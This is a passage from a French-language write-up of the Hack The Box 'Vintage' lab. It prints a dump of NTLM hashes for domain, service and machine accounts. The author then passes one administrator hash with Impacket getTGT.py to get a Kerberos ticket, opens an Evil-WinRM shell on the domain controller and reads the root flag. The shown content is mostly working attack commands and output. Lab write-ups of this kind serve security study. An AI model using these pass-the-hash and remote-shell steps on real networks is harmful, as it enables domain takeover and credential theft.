G.Viola:1114:aad3b435b51404eeaad3b435b51404ee:1d1c5d252941e889d2f3afdd7e0b53bf:::
C.Neri:1115:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
P.Rosa:1116:aad3b435b51404eeaad3b435b51404ee:8c241d5fe65f801b408c96776b38fba2:::
svc_sql:1134:aad3b435b51404eeaad3b435b51404ee:cc5156663cd522d5fa1931f6684af639:::
svc_ldap:1135:aad3b435b51404eeaad3b435b51404ee:7e9670f23027f89b62a006b3bf28f746:::
svc_ark:1136:aad3b435b51404eeaad3b435b51404ee:7e9670f23027f89b62a006b3bf28f746:::
C.Neri_adm:1140:aad3b435b51404eeaad3b435b51404ee:91c4418311c6e34bd2e9a3bda5e96594:::
L.Bianchi_adm:1141:aad3b435b51404eeaad3b435b51404ee:6b751449807e0d73065b0423b64687f0:::
DC01$:1002:aad3b435b51404eeaad3b435b51404ee:2dc5282ca43835331648e7e0bd41f2d5:::
gMSA01$:1107:aad3b435b51404eeaad3b435b51404ee:5008d30496b4c5069ce1fc187b5b5960:::
FS01$:1108:aad3b435b51404eeaad3b435b51404ee:44a59c02ec44a90366ad1d0f8a781274:::
<snip>
```

Je n'ai pas réussi à me connecter en tant que l'utilisateur `administrator` car ce droit lui a été enlevé. Je me connecte donc en tant que `l.bianchi_adm` puis récupère le flag root.
```bash
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤ getTGT.py 'vintage.htb/l.bianchi_adm' -hashes ':6b751449807e0d73065b0423b64687f0'                                                      1 ↵
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in l.bianchi_adm.ccache
╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  export KRB5CCNAME=l.bianchi_adm.ccache

╭─root@exegol-hackthebox /workspace/Vintage
╰─➤  evil-winrm -i dc01.vintage.htb -r vintage.htb

Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Desktop> dir
*Evil-WinRM* PS C:\Users\L.Bianchi_adm\Desktop> cd /users/administrator/desktop
*Evil-WinRM* PS C:\users\administrator\desktop> type root.txt
99f5f5e47a6fa35137f15f6fcf081abd
```
